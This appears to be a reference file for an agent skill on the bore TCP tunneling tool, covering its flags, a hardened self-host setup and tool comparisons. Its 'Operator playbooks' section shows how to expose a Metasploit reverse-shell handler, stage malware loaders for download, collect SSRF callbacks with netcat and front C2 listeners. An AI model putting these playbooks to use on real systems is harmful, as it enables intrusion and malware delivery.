# bore Usage Matrix

Reference companion to `SKILL.md`. Load when you need the full flag surface, hardened self-host recipe, or operator playbook beyond the quick starts.

## Table of Contents

1. Client flag matrix
2. Server flag matrix
3. Self-hosted server: full hardened recipe
4. Operator playbooks
5. Comparison vs related tunneling tools

---

## 1. Client Flag Matrix (`bore local`)

| Flag | Type | Default | Notes |
|---|---|---|---|
| `<LOCAL_PORT>` | u16 (positional) | required | Local TCP port to expose. |
| `-t, --to <HOST>` | string | required | Relay hostname or IP. Public default in examples is `bore.pub`. |
| `-p, --port <PORT>` | u16 | `0` | `0` lets the server assign a random port within its range. Non-zero requests a specific port; server may refuse if unavailable or out of range. |
| `-l, --local-host <HOST>` | string | `localhost` | Useful when the local service binds to a non-loopback interface or when `localhost` resolves to IPv6 but the service is IPv4-only (use `127.0.0.1`). |
| `-s, --secret <SECRET>` | string | unset | HMAC shared secret. Falls back to `BORE_SECRET` env var. Prefer env to keep the secret out of `ps`/shell history. |

Process behavior:

- Single foreground process; exits on control-connection loss with no automatic reconnect.
- Logs to stderr; structured-ish lines including `listening at <host>:<port>`.
- No config file, no daemon mode — wrap with systemd / supervisor / shell loop for resilience.

## 2. Server Flag Matrix (`bore server`)

| Flag | Type | Default | Notes |
|---|---|---|---|
| `--min-port <PORT>` | u16 | `1024` | Lowest tunnel port the server will hand out or accept. |
| `--max-port <PORT>` | u16 | `65535` | Highest tunnel port. Always narrow this on public servers. |
| `-s, --secret <SECRET>` | string | unset | Required HMAC on client handshake. Falls back to `BORE_SECRET`. **Always set on internet-facing servers.** |
| `--bind-addr <IP>` | IP | `0.0.0.0` | Interface for the control listener on `7835/tcp`. |
| `--bind-tunnels <IP>` | IP | inherits `--bind-addr` | Interface for tunnel-port listeners. Split when control should stay private but tunnels need a public IP. |

Server ports to remember:

- `7835/tcp`: control channel (clients connect here).
- `--min-port`..`--max-port`: dynamic tunnel ports for visitor traffic.

## 3. Self-Hosted Server: Full Hardened Recipe

systemd unit (`/etc/systemd/system/bore.service`):

```ini
[Unit]
Description=bore relay server
After=network-online.target
Wants=network-online.target

[Service]
User=bore
Group=bore
EnvironmentFile=/etc/bore.env
ExecStart=/usr/local/bin/bore server \
  --secret ${BORE_SECRET} \
  --min-port 20000 --max-port 20100 \
  --bind-addr 0.0.0.0 \
  --bind-tunnels 0.0.0.0
Restart=on-failure
RestartSec=5
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true
AmbientCapabilities=
CapabilityBoundingSet=

[Install]
WantedBy=multi-user.target
```

`/etc/bore.env` (mode `0600`, owner `root:bore`):

```env
BORE_SECRET=<32-byte-hex-secret>
```

Firewall (ufw example):

```bash
ufw allow from <operator-ip>/32 to any port 7835 proto tcp
ufw allow 20000:20100/tcp
ufw enable
```

User + install:

```bash
useradd --system --no-create-home --shell /usr/sbin/nologin bore
openssl rand -hex 32 > /etc/bore.env.secret  # then format into BORE_SECRET=...
install -o root -g bore -m 0640 /etc/bore.env.secret /etc/bore.env
systemctl daemon-reload
systemctl enable --now bore.service
journalctl -u bore.service -f
```

Client side (matches the recipe above):

```bash
export BORE_SECRET='<same-secret>'
bore local 8080 --to relay.example.com --port 20080
```

## 4. Operator Playbooks

### 4.1 Reverse shell callback (Metasploit)

```bash
# Operator VPS
bore local 4444 --to relay.example.com --port 4444 &
msfconsole -q -x "use exploit/multi/handler;\
  set PAYLOAD linux/x64/meterpreter/reverse_tcp;\
  set LHOST 127.0.0.1; set LPORT 4444; set ExitOnSession false; run -j"
```

Payload (`msfvenom`) is built with `LHOST=relay.example.com LPORT=4444`; the relay maps `relay.example.com:4444 -> 127.0.0.1:4444` on the VPS, where the handler is listening.

### 4.2 Payload + loader staging

```bash
mkdir /tmp/stage && cp loader.exe shell.bin /tmp/stage/
( cd /tmp/stage && python3 -m http.server 8000 --bind 127.0.0.1 ) &
bore local 8000 --to relay.example.com --port 8000
# Distribute: http://relay.example.com:8000/loader.exe
```

Stop bore + the HTTP server immediately after the staging window closes. Rotate file names per delivery to limit replay.

### 4.3 OAST / blind-callback collector

```bash
# Capture absolutely every byte received (raw protocol-agnostic OAST)
sudo tcpdump -i lo -A -s0 -w /tmp/oast.pcap port 5555 &
nc -lkvnp 5555 | tee /tmp/oast.txt &
bore local 5555 --to relay.example.com --port 5555
# Trigger payload: e.g. SSRF callback to tcp://relay.example.com:5555
```

For richer HTTP introspection (headers, body, replay), prefer `webhook-site`. For DNS exfil collection, prefer `interactsh-server` or webhook.site DNSHook. bore shines when the protocol is raw, custom, or unknown.

### 4.4 NAT'd lab inbound reach

```bash
# On each lab VM (cron / systemd unit)
BORE_SECRET=... bore local 22   --to relay --port 30022
BORE_SECRET=... bore local 3389 --to relay --port 30389

# Operator
ssh root@relay -p 30022
xfreerdp /v:relay:30389 ...
```

Always pair with OS firewall rules on the relay so only operator IPs can hit the tunnel ports.

### 4.5 One-shot remote port for an existing daemon

```bash
# Local Adaptix/Sliver listener already bound to 127.0.0.1:8443
bore local 8443 --to relay --port 8443 --secret "$BORE_SECRET"
```

Lets a non-bore-aware C2 listener get a public ingress without code changes.

## 5. Comparison vs Related Tunneling Tools

| Tool | Layer | Public relay | Self-host | Auth | Encryption | Strength |
|---|---|---|---|---|---|---|
| **bore** | TCP | bore.pub | one binary | `--secret` HMAC | none (wrap externally) | Minimal, fast, deterministic remote ports. |
| **pinggy** | HTTP/TCP/TLS/UDP | free.pinggy.io, pro.pinggy.io | SaaS only | SSH key + token | TLS-terminated HTTPS; SSH transport | HTTP debugger, header rewrite, custom domains, UDP. |
| **ngrok** | HTTP/TCP/TLS | ngrok.com | enterprise/agent | account + token | TLS | Rich SaaS, request inspector, traffic policy, OAuth. |
| **cloudflared** | HTTP/TCP/UDP | Cloudflare edge | no | Cloudflare Access | TLS | Cloudflare Zero Trust integration. |
| **chisel** | TCP/SOCKS over HTTP | self only | yes | shared user/pass + fingerprint | TLS or HTTP+optional auth | SOCKS proxy + reverse port-forward over outbound HTTP(S). |
| **ligolo-ng** | L3 (TUN) | self only | yes | mTLS | TLS | Full network-layer pivot through a compromised host. |
| **interactsh** | DNS/HTTP/SMTP | oast.* (ProjectDiscovery) | yes | token | TLS | Multi-protocol OAST collector with built-in correlation. |
| **webhook.site / whcli** | HTTP/DNS | webhook.site | enterprise self-host | token / API key | TLS | OAST + web UI, request inspector, DNSHook, request forwarding. |

Decision shortcut:

- Need a public TCP port with deterministic numbering → **bore**.
- Need HTTPS + rewrite/debugger/QR → **pinggy** or **ngrok**.
- Need OAST with a web UI → **webhook-site** or **interactsh**.
- Need to pivot through a compromised host → **chisel** (SOCKS) or **ligolo-ng** (L3).
